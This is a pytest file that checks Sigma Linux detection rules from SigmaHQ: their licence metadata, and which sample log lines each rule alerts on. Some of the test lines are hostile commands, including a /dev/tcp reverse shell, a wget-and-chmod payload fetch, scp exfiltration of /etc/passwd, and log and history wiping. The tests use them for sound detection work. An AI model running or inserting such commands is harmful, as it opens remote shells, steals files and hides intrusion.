"""The rules taken from SigmaHQ: they load, say where they come from, and find what they should."""

import re
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace

import pytest

from app import sigma
from app.rules import load_rules
from app.rules.engine import detect

RULES_DIR = Path(__file__).resolve().parents[2] / "rules"
FOLDER = RULES_DIR / "sigma"
SHIPPED = load_rules(RULES_DIR)
SIGMA = [rule for rule in SHIPPED.rules if rule.id.startswith("SIGMA-")]


def test_all_of_them_load():
    assert SHIPPED.errors == ()
    assert len(SIGMA) == len(list(FOLDER.glob("*.yaml"))) == 28


@pytest.mark.parametrize("rule", SIGMA, ids=lambda rule: rule.id)
def test_author_source_and_licence_stay_with_every_rule(rule):
    """The Detection Rule License asks this of whoever passes the rules on."""
    assert rule.author
    assert re.fullmatch(
        r"https://github\.com/SigmaHQ/sigma/blob/[0-9a-f]{40}/rules\S+\.yml", rule.source
    )
    assert rule.license == sigma.LICENSE


def test_licence_text_comes_with_the_rules():
    text = (FOLDER / "LICENSE.Detection.Rules.md").read_text(encoding="utf-8")
    assert text.startswith("# Detection Rule License (DRL) 1.1")
    assert "identification of the authors(s)" in text


def test_readme_lists_every_rule_file():
    readme = (FOLDER / "README.md").read_text(encoding="utf-8")
    for path in FOLDER.glob("*.yaml"):
        assert f"({path.name})" in readme


def test_only_the_rule_that_would_alert_on_ordinary_web_traffic_is_switched_off():
    assert [rule.name for rule in SIGMA if not rule.enabled] == ["Cleartext Protocol Usage"]


def found_by(program: str, message: str) -> set[str]:
    """Names of the Sigma rules that alert on one line."""
    event = SimpleNamespace(
        id=1,
        ts=datetime(2026, 9, 9, tzinfo=UTC),
        host="web-01",
        service=program,
        level="info",
        action=None,
        user=None,
        src_ip=None,
        dst_port=None,
        message=message,
    )
    # detect() is given the events that passed the rule's filter; here that is our part.
    return {
        rule.name
        for rule in SIGMA
        if rule.enabled and rule.match.matches(event) and detect(rule, [event])
    }


SUDO = "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND="


@pytest.mark.parametrize(
    ("program", "message", "rules"),
    [
        (
            "sshd",
            "error: buffer_get_ret: trying to get more bytes 1907 than in buffer 308 [preauth]",
            {"SSHD Error Message CVE-2018-15473"},
        ),
        ("sshd", "fatal: buffer_get_string: bad string", {"Suspicious OpenSSH Daemon Error"}),
        # The same words from another program are not sshd's errors.
        ("backup", "restore failed: incorrect signature", set()),
        (
            "sudo",
            "alice : TTY=pts/0 ; PWD=/home/alice ; USER=#-1 ; COMMAND=/usr/bin/id",
            {"Sudo Privilege Escalation CVE-2019-14287 - Builtin"},
        ),
        ("sudo", SUDO + "/usr/bin/id", set()),
        (
            "pkexec",
            "alice: The value for environment variable XAUTHORITY contains suspicious content "
            "[USER=root] [TTY=/dev/pts/0] [CWD=/home/alice] [COMMAND=/bin/sh]",
            {"PwnKit Local Privilege Escalation"},
        ),
        ("pkexec", "alice: Executing command [USER=root] [TTY=/dev/pts/0]", set()),
        ("crontab", "(alice) REPLACE (alice)", {"Modifying Crontab"}),
        ("CRON", "(root) CMD (/usr/local/bin/backup)", set()),
        ("kernel", "device eth0 entered promiscuous mode", {"Suspicious Log Entries"}),
        (
            "useradd",
            "new user: name=mallory, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/1",
            {"Privileged User Has Been Created"},
        ),
        (
            "useradd",
            "new user: name=carol, UID=1004, GID=1004, home=/home/carol, shell=/bin/bash",
            set(),
        ),
        (
            "sudo",
            SUDO + "/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
            {"Suspicious Reverse Shell Command Line", "Suspicious Use of /dev/tcp"},
        ),
        (
            "sudo",
            SUDO + "/bin/sh -c wget http://203.0.113.9/x -O /tmp/x; chmod +x /tmp/x",
            {"Suspicious Activity in Shell Commands"},
        ),
        (
            "sudo",
            SUDO + "/bin/rm /var/log/syslog",
            {"Commands to Clear or Remove the Syslog - Builtin"},
        ),
        ("sudo", SUDO + "/bin/rm /var/log/syslog.7.gz", set()),  # what log rotation does
        ("sudo", SUDO + "/usr/bin/scp /etc/passwd eve@203.0.113.9:/tmp/", {"Remote File Copy"}),
        ("sudo", SUDO + "/bin/sh -c history -c", {"Linux Command History Tampering"}),
        ("sudo", SUDO + "/bin/ln -s /etc/passwd /tmp/p", {"Symlink Etc Passwd"}),
        ("sudo", SUDO + "/usr/bin/tee /etc/ld.so.preload", {"Code Injection by ld.so Preload"}),
        (
            "systemd",
            "Stopping firewalld - dynamic firewall daemon...",
            {"Disabling Security Tools - Builtin"},
        ),
        ("clamd", "/srv/upload/a.php: Php.Webshell.Agent-1 FOUND", {"Relevant ClamAV Message"}),
        ("clamd", "/srv/upload/a.txt: OK", set()),
        ("sshd", "Failed password for root from 203.0.113.45 port 4242 ssh2", set()),
        ("sshd", "Accepted password for bob from 203.0.113.99 port 4242 ssh2", set()),
        (
            "kernel",
            "[UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.150 DST=192.0.2.5 "
            "LEN=44 TTL=54 PROTO=TCP SPT=41000 DPT=23 WINDOW=1024 SYN",
            set(),
        ),
    ],
)
def test_lines_and_the_rules_that_alert_on_them(program, message, rules):
    assert found_by(program, message) == rules
